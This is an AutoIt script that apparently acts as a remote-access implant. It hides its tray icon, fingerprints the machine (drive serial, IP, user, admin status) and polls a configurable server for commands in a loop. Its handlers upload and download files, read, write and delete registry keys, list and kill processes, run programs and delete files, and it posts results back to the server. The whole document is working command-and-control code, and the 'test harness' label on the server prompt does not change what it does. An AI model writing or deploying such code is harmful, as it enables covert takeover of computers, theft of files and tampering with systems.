#include "winhttp.au3"
#include <File.au3>
#include <FileConstants.au3>
#include <MsgBoxConstants.au3>
#include <WinAPIFiles.au3>

#include <Array.au3>

OnAutoItExitRegister("DIECALL")

if $CmdLine[0] = 0 Then
   Global $serv = InputBox("Server", "URL of server test harness", "http://127.0.0.1:9999", "", _
				- 1, -1, 0, 0)
else
	Global $serv = $CmdLine[1]
	MsgBox(64, "DEBUG", "Connecting to " & @CRLF&$CmdLine[1], 5)
endif

global $sSerial = DriveGetSerial(@HomeDrive & "\") & "_" & @IPAddress1 & "_" & IsAdmin ( )
AutoItSetOption ( "TrayIconHide", 1 )
global $go = 1
while $go

   Global $output = HttpGet($serv&"/harness/"&$sSerial, "name=" & @ComputerName & "&user=" & @UserName & "&host=" & @OSVersion & "&desk="&@DesktopWidth&"x"&@DesktopHeight & "&ip=" & @IPAddress1 & "&adm=" & IsAdmin())
   if @error then; Catch
	  MsgBox(64, "ERROR", "Server Not available", 5)
	  SetError(0, 0, "")
	  Sleep(60000)
	  ContinueLoop
   EndIf
   Global $acmd = StringSplit ( $output, ","  )
   MsgBox(64, "CMD", $acmd[1] , 3)

   if $acmd[1] == "terminate" Then
	  ;MsgBox(64, $acmd[1], "closing", 1)
	  ExitLoop

   ElseIf $acmd[1] == "list_processes" Then
	  lp()
   ElseIf $acmd[1] == "echo" Then
	  eo($acmd[2])
   ElseIf $acmd[1] == "list_files" Then
	  lf($acmd[2])
   ElseIf $acmd[1] == "put_file" Then
	  pf($acmd[2], $acmd[3])
   ElseIf $acmd[1] == "get_file" Then
	  gf($acmd[2], $acmd[3])
   ElseIf $acmd[1] == "read_registry" Then
	  rrk($acmd[2], $acmd[3])
   ElseIf $acmd[1] == "delete_registry" Then
	  drk($acmd[2])
   ElseIf $acmd[1] == "write_registry" Then
	  rwk($acmd[2], $acmd[3], $acmd[4], $acmd[5])
   ElseIf $acmd[1] == "sleep" Then
	  s($acmd[2])
   ElseIf $acmd[1] == "create_process" Then
	  cp($acmd[2])
   ElseIf $acmd[1] == "terminate_process" Then
	  tp($acmd[2])
   ElseIf $acmd[1] == "delete_file" Then
	  df($acmd[2])
   EndIf
WEnd



func path_helper($pth)
   $pth2 = StringReplace($pth, "%appdata%", @AppDataDir)
   $pth2 = StringReplace($pth2, "%temp%", @TempDir)
   Return $pth2
EndFunc

func eo($data)
   HttpPost($serv&"/response/"&$sSerial, "data="&$data)
EndFunc

func df($pth)
   FileDelete(path_helper($pth))
EndFunc


func tp($nme)
   Local $pid = ProcessExists ( $nme )
   if $pid Then
	  ProcessClose ( $pid )
   EndIf
EndFunc


func cp($pth)
   Run(path_helper($pth))
EndFunc


func s($strtime)
   if StringIsInt ( $strtime ) Then
	  Sleep($strtime)
   EndIf
EndFunc

func lf ($args)
   $args = path_helper($args)
   Local $fl = _FileListToArray($args, "*")
   global $i
   global $r = ""
   For $i = 1 To $fl[0]
	  $r =  $r &  $args & $fl[$i] & @LF
   Next
   Global $newout = HttpPost($serv&"/response/"&$sSerial, "data="&$r)
EndFunc

func pf ($fid, $floc)
   global $pout = HttpGet($serv&"/givemethat/"&$sSerial&"/"& $fid)
   Local $hFileOpen = FileOpen(path_helper($floc), $FO_OVERWRITE+$FO_BINARY)
   FileWrite($hFileOpen, Binary($pout))
   FileClose($hFileOpen)
EndFunc

func gf ($fid, $floc)
   Local $hFileOpen = FileOpen(path_helper($floc), $FO_BINARY)
   local $content = FileRead($hFileOpen)
   FileClose($hFileOpen)
   global $pout = HttpPOST($serv&"/givemethat/"&$sSerial &"/"& $fid, "data="&$content)
EndFunc

func rrk($key, $name)
   Local $sData = RegRead($key, $name)
   global $pout = HttpPOST($serv&"/response/"&$sSerial, "data="&$sData)
EndFunc

func rwk($key, $valuename, $type, $value)
   RegWrite($key, $valuename, $type, $value)
EndFunc

func drk($key)
   RegDelete($key)
EndFunc

func lp()
   global $pl = ProcessList()
   global $i = 0
   global $r = ""
   For $i = 1 To $pl[0][0]
	  $r =  $r &  $pl[$i][0] & "," &  $pl[$i][1] & @LF
   Next
   Global $newout = HttpPost($serv&"/response/"&$sSerial, "data="&$r)
EndFunc

func DIECALL()
	  HttpGet($serv&"/harness/"&$sSerial, "name=" & @ComputerName & "&exit=" & @exitCode & "&exitmethod=" & @exitMethod & "&user=" & @UserName & "&host=" & @OSVersion & "&desk="&@DesktopWidth&"x"&@DesktopHeight & "&ip=" & @IPAddress1 & "&adm=" & IsAdmin())
EndFunc